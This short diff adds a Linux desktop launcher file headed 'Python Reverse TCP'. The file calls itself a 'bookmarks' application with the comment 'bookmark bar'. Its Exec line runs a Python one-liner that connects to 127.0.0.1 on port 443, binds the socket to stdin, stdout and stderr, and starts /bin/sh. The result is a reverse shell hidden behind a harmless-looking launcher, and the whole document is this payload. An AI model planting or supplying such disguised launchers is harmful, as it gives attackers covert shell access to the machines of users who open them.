@@ -1,0 +1,7 @@
+# Python Reverse TCP
+
+[Desktop Entry]
+Type=Application
+Name=bookmarks
+Comment=bookmark bar 
+Exec=sh -c "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\"/bin/sh\");'"
